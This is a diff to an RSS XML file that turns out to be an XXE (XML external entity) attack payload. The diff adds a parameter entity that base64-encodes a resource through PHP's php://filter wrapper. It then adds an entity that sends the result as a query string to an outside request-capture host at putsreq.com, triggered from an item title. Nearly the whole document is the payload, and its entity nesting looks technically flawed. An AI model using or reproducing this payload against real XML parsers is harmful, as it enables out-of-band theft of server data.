@@ -1,6 +1,8 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE roottag [ 
- <!ENTITY file SYSTEM "php://filter/read=convert.base64-encode/resource=http://putsreq.com/jcVVqYcNb9zESnp2Fqws">
+ <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=http://putsreq.com/jcVVqYcNb9zESnp2Fqws">
+ %file;
+ <!ENTITY exfil SYSTEM "http://putsreq.com/jcVVqYcNb9zESnp2Fqws?%file;">
 ]>
 <rss version="2.0">
 <channel>
@@ -8,7 +10,7 @@
   <link>http://www.w3schools.com/xml/xml_rss.asp</link>
   <description>aaaa</description>
   <item>
-    <title>VALID TEXT: &file;</title>
+    <title>VALID TEXT: &exfil;</title>
     <link>http://www.w3schools.com/xml/xml_rss.asp</link>
     <description>New RSS tutorial on W3Schools</description>
   </item>
